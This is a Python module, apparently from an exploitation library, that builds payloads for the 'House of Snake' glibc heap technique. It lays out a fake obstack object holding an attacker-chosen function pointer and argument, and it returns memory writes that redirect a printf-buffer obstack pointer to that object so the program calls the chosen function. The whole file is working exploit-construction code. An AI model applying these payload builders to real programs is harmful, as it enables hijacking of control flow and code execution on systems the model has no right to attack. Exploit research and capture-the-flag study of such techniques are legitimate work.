"""House of Snake payload builders."""

from __future__ import annotations

from dataclasses import dataclass


OBSTACK_CHUNKFUN = 0x38
OBSTACK_EXTRA_ARG = 0x40
OBSTACK_USE_EXTRA_ARG = 0x50
OBSTACK_OBJECT_BASE = 0x58
OBSTACK_NEXT_FREE = 0x60
OBSTACK_CHUNK_LIMIT = 0x68
OBSTACK_IMAGE_SIZE = 0x70
UINT64_LIMIT = 1 << 64


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


@dataclass(frozen=True)
class SnakePlan:
    printf_buffer_addr: int
    obstack_addr: int
    object_base: int
    next_free: int
    chunk_limit: int
    chunkfun: int
    extra_arg: int


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def build_house_of_snake(
    *,
    printf_buffer_addr: int,
    obstack_addr: int,
    object_base: int,
    next_free: int,
    chunkfun_addr: int,
    extra_arg: int,
    chunk_limit: int | None = None,
) -> SnakePlan:
    """Return the fields consumed by the 2.37+ printf-buffer obstack sink."""

    if chunk_limit is None:
        chunk_limit = next_free

    for name, value in {
        "printf_buffer_addr": printf_buffer_addr,
        "obstack_addr": obstack_addr,
        "object_base": object_base,
        "next_free": next_free,
        "chunk_limit": chunk_limit,
        "chunkfun_addr": chunkfun_addr,
        "extra_arg": extra_arg,
    }.items():
        _check_uint64(name, value)

    return SnakePlan(
        printf_buffer_addr=printf_buffer_addr,
        obstack_addr=obstack_addr,
        object_base=object_base,
        next_free=next_free,
        chunk_limit=chunk_limit,
        chunkfun=chunkfun_addr,
        extra_arg=extra_arg,
    )


def build_house_of_snake_payload(
    *,
    printf_buffer_addr: int,
    obstack_pointer_addr: int,
    obstack_addr: int,
    object_base: int,
    next_free: int,
    chunkfun_addr: int,
    extra_arg: int,
    chunk_limit: int | None = None,
) -> tuple[MemoryWrite, ...]:
    """Build writes for the printf-buffer obstack sink.

    ``obstack_pointer_addr`` is explicit because ``__printf_buffer_obstack`` is
    an internal structure whose obstack pointer offset is Build-ID dependent.
    """

    _check_uint64("obstack_pointer_addr", obstack_pointer_addr)
    plan = build_house_of_snake(
        printf_buffer_addr=printf_buffer_addr,
        obstack_addr=obstack_addr,
        object_base=object_base,
        next_free=next_free,
        chunkfun_addr=chunkfun_addr,
        extra_arg=extra_arg,
        chunk_limit=chunk_limit,
    )

    image = bytearray(OBSTACK_IMAGE_SIZE)
    image[OBSTACK_CHUNKFUN:OBSTACK_CHUNKFUN + 8] = _pack64(plan.chunkfun)
    image[OBSTACK_EXTRA_ARG:OBSTACK_EXTRA_ARG + 8] = _pack64(plan.extra_arg)
    image[OBSTACK_USE_EXTRA_ARG:OBSTACK_USE_EXTRA_ARG + 4] = (1).to_bytes(4, "little")
    image[OBSTACK_OBJECT_BASE:OBSTACK_OBJECT_BASE + 8] = _pack64(plan.object_base)
    image[OBSTACK_NEXT_FREE:OBSTACK_NEXT_FREE + 8] = _pack64(plan.next_free)
    image[OBSTACK_CHUNK_LIMIT:OBSTACK_CHUNK_LIMIT + 8] = _pack64(plan.chunk_limit)

    return (
        MemoryWrite(
            obstack_pointer_addr,
            _pack64(plan.obstack_addr),
            "printf_buffer.obstack pointer",
        ),
        MemoryWrite(
            plan.obstack_addr,
            bytes(image),
            "fake obstack object",
        ),
    )
